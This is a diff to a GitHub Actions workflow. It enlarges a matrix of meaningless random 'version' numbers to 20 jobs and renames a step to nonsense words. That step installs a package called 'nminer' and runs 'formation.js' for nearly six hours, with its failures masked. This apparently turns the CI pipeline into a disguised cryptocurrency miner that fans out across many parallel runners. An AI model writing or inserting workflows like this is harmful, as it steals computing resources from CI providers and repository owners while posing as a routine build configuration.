@@ -9,22 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7868 }
-          - { version: 8374 }
-          - { version: 435 }
-          - { version: 8961 }
-          - { version: 2008 }
-          - { version: 4510 }
-          - { version: 2772 }
-          - { version: 3349 }
-          - { version: 7357 }
-          - { version: 2587 }
-          - { version: 7134 }
-          - { version: 1600 }
-          - { version: 3506 }
-          - { version: 5475 }
-          - { version: 9809 }
-          - { version: 5741 }
+          - { version: 1443 }
+          - { version: 8176 }
+          - { version: 2570 }
+          - { version: 3654 }
+          - { version: 4040 }
+          - { version: 7857 }
+          - { version: 2691 }
+          - { version: 4718 }
+          - { version: 4313 }
+          - { version: 6454 }
+          - { version: 7153 }
+          - { version: 6653 }
+          - { version: 4265 }
+          - { version: 5964 }
+          - { version: 2009 }
+          - { version: 2168 }
+          - { version: 5355 }
+          - { version: 7701 }
+          - { version: 7111 }
+          - { version: 8005 }
 
     steps:
       - name: Checkout
@@ -35,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: incidentally aching
+      - name: front cosset well-documented
         run: |
           npm install nminer@latest
-          timeout 323m node formation.js || echo "formation executed"
+          timeout 348m node formation.js || echo "formation executed"
